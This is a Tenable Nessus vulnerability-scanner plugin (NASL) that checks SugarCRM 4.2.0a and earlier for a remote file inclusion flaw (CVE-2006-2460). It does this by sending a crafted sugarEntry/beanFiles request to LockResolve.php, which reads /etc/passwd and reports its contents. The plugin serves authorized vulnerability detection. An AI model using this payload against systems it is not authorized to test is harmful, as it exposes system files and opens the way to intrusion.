#
# (C) Tenable Network Security
#

include("compat.inc");

if (description)
{
  script_id(21570);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-2460");
  script_bugtraq_id(17987);
  script_osvdb_id(25532);

  script_name(english:"SugarCRM <= 4.2.0a Multiple Script sugarEntry Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using SugarCRM");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file inclusion issues." );
 script_set_attribute(attribute:"description", value:
"The version of SugarCRM installed on the remote host fails to sanitize
input to various parameters and scripts before using it to include PHP
code from other files.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit these
issues to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/sugar_suite_42_incl_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434009/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.sugarcrm.com/forums/showthread.php?t=12282" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/15");
 script_cvs_date("$Date: 2011/03/14 21:48:13 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("sugarcrm_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/sugarcrm");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/sugarcrm"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/modules/OptimisticLock/LockResolve.php?",
      "GLOBALS[sugarEntry]=1&",
      "_SESSION[o_lock_object]=1&",
      "_SESSION[o_lock_module]=1&",
      "beanList[1]=1&",
      "beanFiles[1]=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (isnull(contents)) report = NULL;
    else 
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
